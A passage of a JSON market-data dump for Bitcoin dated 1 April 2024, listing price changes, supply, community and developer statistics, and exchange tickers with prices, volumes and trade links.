            ""vnd"": 1.25087,
            ""xag"": 0.61652,
            ""xau"": 0.03838,
            ""xdr"": 1.31712,
            ""xlm"": -0.36575,
            ""xrp"": 0.18958,
            ""yfi"": -3.27199,
            ""zar"": 0.97212,
            ""bits"": -0.00431,
            ""link"": 0.21588,
            ""sats"": -0.00431
        },
        ""total_supply"": 21000000.0,
        ""max_supply"": 21000000.0,
        ""circulating_supply"": 19669850.0,
        ""last_updated"": ""2024-04-01T02:13:26.065Z""
    },
    ""community_data"": {
        ""facebook_likes"": null,
        ""twitter_followers"": 6546218,
        ""reddit_average_posts_48h"": 0.0,
        ""reddit_average_comments_48h"": 0.0,
        ""reddit_subscribers"": 0,
        ""reddit_accounts_active_48h"": 0,
        ""telegram_channel_user_count"": null
    },
    ""developer_data"": {
        ""forks"": 36426,
        ""stars"": 73168,
        ""subscribers"": 3967,
        ""total_issues"": 7743,
        ""closed_issues"": 7380,
        ""pull_requests_merged"": 11215,
        ""pull_request_contributors"": 846,
        ""code_additions_deletions_4_weeks"": {
            ""additions"": 1570,
            ""deletions"": -1948
        },
        ""commit_count_4_weeks"": 108,
        ""last_4_weeks_commit_activity_series"": []
    },
    ""status_updates"": [],
    ""last_updated"": ""2024-04-01T02:13:26.065Z"",
    ""tickers"": [
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 70823.93,
            ""volume"": 19380.28454,
            ""converted_last"": {
                ""btc"": 0.99941509,
                ""eth"": 19.617801,
                ""usd"": 70811
            },
            ""converted_volume"": {
                ""btc"": 19315,
                ""eth"": 379139,
                ""usd"": 1368506402
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:01+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:01+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:01+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BTC_USDT?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""Coinbase Exchange"",
                ""identifier"": ""gdax"",
                ""has_trading_incentive"": false
            },
            ""last"": 70889.5,
            ""volume"": 4534.33858458,
            ""converted_last"": {
                ""btc"": 1.000528,
                ""eth"": 19.639643,
                ""usd"": 70890
            },
            ""converted_volume"": {
                ""btc"": 4537,
                ""eth"": 89053,
                ""usd"": 321436995
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinbase.com/advanced-trade/spot/BTC-USD"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""Bitfinex"",
                ""identifier"": ""bitfinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70895.0,
            ""volume"": 1254.53976539,
            ""converted_last"": {
                ""btc"": 1.000605,
                ""eth"": 19.641167,
                ""usd"": 70895
            },
            ""converted_volume"": {
                ""btc"": 1255,
                ""eth"": 24641,
                ""usd"": 88940597
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.014098,
            ""timestamp"": ""2024-04-01T02:12:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://trading.bitfinex.com/t/BTC:USD?type=exchange"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""FDUSD"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 70741.79,
            ""volume"": 46909.03502,
            ""converted_last"": {
                ""btc"": 1.000308,
                ""eth"": 19.636531,
                ""usd"": 70914
            },
            ""converted_volume"": {
                ""btc"": 46607,
                ""eth"": 914915,
                ""usd"": 3304050225
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.014212,
            ""timestamp"": ""2024-04-01T02:04:20+00:00"",
            ""last_traded_at"": ""2024-04-01T02:04:20+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:04:20+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BTC_FDUSD?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""first-digital-usd""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 70846.4,
            ""volume"": 1164.85529354,
            ""converted_last"": {
                ""btc"": 0.99991955,
                ""eth"": 19.627703,
                ""usd"": 70846
            },
            ""converted_volume"": {
                ""btc"": 1165,
                ""eth"": 22863,
                ""usd"": 82525804
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-USD"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Gate.io"",
                ""identifier"": ""gate"",
                ""has_trading_incentive"": false
            },
            ""last"": 70822.9,
            ""volume"": 2228.5344684685,
            ""converted_last"": {
                ""btc"": 0.99940055,
                ""eth"": 19.617515,
                ""usd"": 70810
            },
            ""converted_volume"": {
                ""btc"": 2225,
                ""eth"": 43670,
                ""usd"": 157626932
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:12:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:28+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://gate.io/trade/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 65712.8,
            ""volume"": 352.73442868,
            ""converted_last"": {
                ""btc"": 1.000322,
                ""eth"": 19.635599,
                ""usd"": 70875
            },
            ""converted_volume"": {
                ""btc"": 352.848,
                ""eth"": 6926,
                ""usd"": 25000018
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010152,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-EUR"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""MEXC"",
                ""identifier"": ""mxc"",
                ""has_trading_incentive"": false
            },
            ""last"": 70840.01,
            ""volume"": 8994.043812,
            ""converted_last"": {
                ""btc"": 0.999642,
                ""eth"": 19.622255,
                ""usd"": 70827
            },
            ""converted_volume"": {
                ""btc"": 8991,
                ""eth"": 176483,
                ""usd"": 637018757
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:11:38+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:38+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:38+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.mexc.com/exchange/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bitfinex"",
                ""identifier"": ""bitfinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70849.0,
            ""volume"": 293.32226849,
            ""converted_last"": {
                ""btc"": 0.99976886,
                ""eth"": 19.624745,
                ""usd"": 70836
            },
            ""converted_volume"": {
                ""btc"": 293.254,
                ""eth"": 5756,
                ""usd"": 20777695
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.014118,
            ""timestamp"": ""2024-04-01T02:12:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://trading.bitfinex.com/t/BTC:UST?type=exchange"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""OKX"",
                ""identifier"": ""okex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70835.1,
            ""volume"": 5290.17447167,
            ""converted_last"": {
                ""btc"": 0.99957271,
                ""eth"": 19.620895,
                ""usd"": 70822
            },
            ""converted_volume"": {
                ""btc"": 5275,
                ""eth"": 103549,
                ""usd"": 373762905
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:12:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.okx.com/trade-spot/btc-usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""WBTC"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 1.0003,
            ""volume"": 208.79574,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 208.976,
                ""eth"": 4102,
                ""usd"": 14806413
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019997,
            ""timestamp"": ""2024-04-01T02:11:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:44+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/WBTC_BTC?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""wrapped-bitcoin"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""FMFW.io"",
                ""identifier"": ""bitcoin_com"",
                ""has_trading_incentive"": false
            },
            ""last"": 70821.3,
            ""volume"": 704.27043,
            ""converted_last"": {
                ""btc"": 0.99937798,
                ""eth"": 19.617072,
                ""usd"": 70808
            },
            ""converted_volume"": {
                ""btc"": 703.832,
                ""eth"": 13816,
                ""usd"": 49868001
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:11:15+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:15+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:15+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://fmfw.io/BTC-to-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bybit"",
                ""identifier"": ""bybit_spot"",
                ""has_trading_incentive"": false
            },
            ""last"": 70835.11,
            ""volume"": 4495.749575,
            ""converted_last"": {
                ""btc"": 0.99957285,
                ""eth"": 19.620897,
                ""usd"": 70822
            },
            ""converted_volume"": {
                ""btc"": 4483,
                ""eth"": 88002,
                ""usd"": 317642888
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:20+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:20+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:20+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bybit.com/trade/spot/BTC/USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""OKX"",
                ""identifier"": ""okex"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05097,
            ""volume"": 8911.60626,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 456.513,
                ""eth"": 8961,
                ""usd"": 32344931
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019619,
            ""timestamp"": ""2024-04-01T02:12:20+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:20+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:20+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.okx.com/trade-spot/eth-btc"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""C-Patex"",
                ""identifier"": ""c_patex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70842.01509,
            ""volume"": 481.19015917,
            ""converted_last"": {
                ""btc"": 0.99970598,
                ""eth"": 19.621069,
                ""usd"": 70826
            },
            ""converted_volume"": {
                ""btc"": 481.049,
                ""eth"": 9441,
                ""usd"": 34081010
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.013202,
            ""timestamp"": ""2024-04-01T02:09:08+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:08+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:08+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://c-patex.com/exchange/BTC/USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05097,
            ""volume"": 34265.3026,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.639944,
                ""usd"": 70849
            },
            ""converted_volume"": {
                ""btc"": 1755,
                ""eth"": 34469,
                ""usd"": 124344689
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019631,
            ""timestamp"": ""2024-04-01T01:54:55+00:00"",
            ""last_traded_at"": ""2024-04-01T01:54:55+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:54:55+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/ETH_BTC?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Hotcoin Global"",
                ""identifier"": ""hotcoin_global"",
                ""has_trading_incentive"": false
            },
            ""last"": 70797.51,
            ""volume"": 4068.7805,
            ""converted_last"": {
                ""btc"": 0.99970304,
                ""eth"": 19.62227,
                ""usd"": 70823
            },
            ""converted_volume"": {
                ""btc"": 4068,
                ""eth"": 79839,
                ""usd"": 288163227
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010508,
            ""timestamp"": ""2024-04-01T02:07:21+00:00"",
            ""last_traded_at"": ""2024-04-01T02:07:21+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:07:21+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.hotcoin.com/currencyExchange/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bitget"",
                ""identifier"": ""bitget"",
                ""has_trading_incentive"": false
            },
            ""last"": 70839.64,
            ""volume"": 8466.855425,
            ""converted_last"": {
                ""btc"": 0.99963678,
                ""eth"": 19.622152,
                ""usd"": 70826
            },
            ""converted_volume"": {
                ""btc"": 8429,
                ""eth"": 165457,
                ""usd"": 597219151
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.023205,
            ""timestamp"": ""2024-04-01T02:11:08+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:08+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:08+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitget.com/spot/BTCUSDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""BigONE"",
                ""identifier"": ""bigone"",
                ""has_trading_incentive"": false
            },
            ""last"": 70823.93,
            ""volume"": 1916.247466,
            ""converted_last"": {
                ""btc"": 0.99941509,
                ""eth"": 19.617801,
                ""usd"": 70811
            },
            ""converted_volume"": {
                ""btc"": 1915,
                ""eth"": 37593,
                ""usd"": 135690744
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010193,
            ""timestamp"": ""2024-04-01T02:12:06+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:06+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:06+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://big.one/trade/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""WOO X"",
                ""identifier"": ""wootrade"",
                ""has_trading_incentive"": false
            },
            ""last"": 70834.12,
            ""volume"": 117.571146,
            ""converted_last"": {
                ""btc"": 0.99955888,
                ""eth"": 19.620623,
                ""usd"": 70821
            },
            ""converted_volume"": {
                ""btc"": 117.519,
                ""eth"": 2307,
                ""usd"": 8326488
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:28+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://x.woo.network/spot"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Dcoin"",
                ""identifier"": ""dcoin"",
                ""has_trading_incentive"": false
            },
            ""last"": 70828.68,
            ""volume"": 250.0,
            ""converted_last"": {
                ""btc"": 0.9995178,
                ""eth"": 19.617375,
                ""usd"": 70813
            },
            ""converted_volume"": {
                ""btc"": 249.879,
                ""eth"": 4904,
                ""usd"": 17703289
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019997,
            ""timestamp"": ""2024-04-01T02:09:06+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:06+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:06+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.dcoin.com/currencyTrading/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Tapbit"",
                ""identifier"": ""tapbit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70861.02,
            ""volume"": 843.71686,
            ""converted_last"": {
                ""btc"": 1.000275,
                ""eth"": 19.635892,
                ""usd"": 70911
            },
            ""converted_volume"": {
                ""btc"": 840.94,
                ""eth"": 16508,
                ""usd"": 59615896
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:04:38+00:00"",
            ""last_traded_at"": ""2024-04-01T02:04:38+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:04:38+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.tapbit.com/spot/exchange/BTC_USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Tapbit"",
                ""identifier"": ""tapbit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70843.56,
            ""volume"": 1279.0139,
            ""converted_last"": {
                ""btc"": 0.99960746,
                ""eth"": 19.622786,
                ""usd"": 70864
            },
            ""converted_volume"": {
                ""btc"": 1274,
                ""eth"": 25017,
                ""usd"": 90343174
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:04:39+00:00"",
            ""last_traded_at"": ""2024-04-01T02:04:39+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:04:39+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.tapbit.com/spot/exchange/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Coinbase Exchange"",
                ""identifier"": ""gdax"",
                ""has_trading_incentive"": false
            },
            ""last"": 65742.3,
            ""volume"": 192.92994864,
            ""converted_last"": {
                ""btc"": 1.000771,
                ""eth"": 19.644414,
                ""usd"": 70907
            },
            ""converted_volume"": {
                ""btc"": 193.079,
                ""eth"": 3790,
                ""usd"": 13680030
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.018179,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinbase.com/advanced-trade/spot/BTC-EUR"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""HitBTC"",
                ""identifier"": ""hitbtc"",
                ""has_trading_incentive"": false
            },
            ""last"": 70828.3,
            ""volume"": 704.35994,
            ""converted_last"": {
                ""btc"": 0.99947675,
                ""eth"": 19.619011,
                ""usd"": 70815
            },
            ""converted_volume"": {
                ""btc"": 702.466,
                ""eth"": 13789,
                ""usd"": 49771221
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:42+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:42+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:42+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://hitbtc.com/BTC-to-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""HTX"",
                ""identifier"": ""huobi"",
                ""has_trading_incentive"": false
            },
            ""last"": 70819.74,
            ""volume"": 3879.95363549878,
            ""converted_last"": {
                ""btc"": 0.99935596,
                ""eth"": 19.61664,
                ""usd"": 70806
            },
            ""converted_volume"": {
                ""btc"": 3859,
                ""eth"": 75750,
                ""usd"": 273418956
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:13+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:13+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:13+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.huobi.com/en-us/exchange/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""SOL"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.0028587,
            ""volume"": 191399.25,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 538.069,
                ""eth"": 10562,
                ""usd"": 38123301
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.013488,
            ""timestamp"": ""2024-04-01T02:12:11+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:11+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:11+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/SOL_BTC?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""solana"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""CoinW"",
                ""identifier"": ""coinw"",
                ""has_trading_incentive"": false
            },
            ""last"": 70805.25,
            ""volume"": 2536.0922,
            ""converted_last"": {
                ""btc"": 0.9990669,
                ""eth"": 19.614743,
                ""usd"": 70776
            },
            ""converted_volume"": {
                ""btc"": 2534,
                ""eth"": 49745,
                ""usd"": 179493735
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:02:30+00:00"",
            ""last_traded_at"": ""2024-04-01T02:02:30+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:02:30+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.coinw.com/front/market"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Bybit"",
                ""identifier"": ""bybit_spot"",
                ""has_trading_incentive"": false
            },
            ""last"": 70857.25,
            ""volume"": 4971.623096,
            ""converted_last"": {
                ""btc"": 1.000074,
                ""eth"": 19.630734,
                ""usd"": 70857
            },
            ""converted_volume"": {
                ""btc"": 4952,
                ""eth"": 97212,
                ""usd"": 350889033
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.01724,
            ""timestamp"": ""2024-04-01T02:12:21+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:21+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:21+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bybit.com/trade/spot/BTC/USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 70852.01,
            ""volume"": 25.14037481,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 25.140375,
                ""eth"": 493.488,
                ""usd"": 1781248
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.013655,
            ""timestamp"": ""2024-04-01T02:08:01+00:00"",
            ""last_traded_at"": ""2024-04-01T02:08:01+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 70823.2,
            ""volume"": 218.56981511,
            ""converted_last"": {
                ""btc"": 0.99940479,
                ""eth"": 19.617598,
                ""usd"": 70810
            },
            ""converted_volume"": {
                ""btc"": 218.44,
                ""eth"": 4288,
                ""usd"": 15476913
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.0172,
